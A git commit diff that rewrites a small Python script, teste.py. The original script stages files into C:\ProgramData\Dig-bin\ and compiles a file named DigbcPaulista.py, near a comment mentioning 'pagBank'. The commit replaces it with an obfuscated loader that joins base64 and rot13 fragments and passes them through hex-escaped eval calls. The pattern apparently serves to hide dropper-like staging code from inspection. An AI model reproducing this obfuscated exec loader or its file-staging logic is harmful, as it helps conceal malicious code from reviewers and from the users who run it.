379d9159bd1d34c6dbda2a5efe0e6c7b26766082
rots1 <89531619+rots1@users.noreply.github.com>
2022-03-29 14:50:06 -0400

    Update teste.py

--- teste.py
+++ teste.py
@@ -1,34 +1,8 @@
-
-import os
-import py_compile
-import shutil
-import csv
-from random import random
-from os.path import isfile, join, basename
-
-
-
-
-
-#  '/home/anon/Documentos/pagBank/'
-
-path_origem =  'fomm\\sptx.json'
-path_destino = 'C:\\ProgramData\\Dig-bin\\'
-
-try:
-    os.mkdir(path_destino)
-    print('.....')
-    
-except Exception as e:
-    pass
-
-try:
-    shutil.move(path_origem, join(path_destino, basename(path_origem)))
-except:
-    pass
-
-py_compile.compile('fomm\\DigbcPaulista.py')
-
-
-
-exit(69)
+import base64, codecs
+magic = 'DQppbXBvcnQgb3MNCmltcG9ydCBweV9jb21waWxlDQppbXBvcnQgc2h1dGlsDQppbXBvcnQgY3N2DQpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZG9tDQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSwgam9pbiwgYmFzZW5hbWUN'
+love = 'Pt0XQDbAPt0XQDbwVPNaY2uioJHiLJ5iov9Ro2A1oJIhqT9mY3OuM0WuozfiWj0XQDcjLKEbK29lnJqyoFN9VPNaMz9goIkpp3O0rP5dp29hWj0XpTS0nS9xMKA0nJ5iVQ0tW0Z6KSkDpz9apzSgETS0LIkpETyaYJWcoykpWj0X'
+god = 'DQp0cnk6DQogICAgb3MubWtkaXIocGF0aF9kZXN0aW5vKQ0KICAgIHByaW50KCcuLi4uLicpDQogICAgDQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgcGFzcw0KDQp0cnk6DQogICAgc2h1dGlsLm1vdmUocGF0aF9vcmln'
+destiny = 'MJ0fVTcinJ4bpTS0nS9xMKA0nJ5iYPOvLKAyozSgMFujLKEbK29lnJqyoFxcXD0XMKuwMKO0Bt0XVPNtVUOup3ZAPt0XpUysL29gpTyfMF5wo21jnJkyXPqzo21gKSkRnJqvL1OuqJkcp3EuYaO5WlxAPt0XQDbAPzI4nKDbAwxc'
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
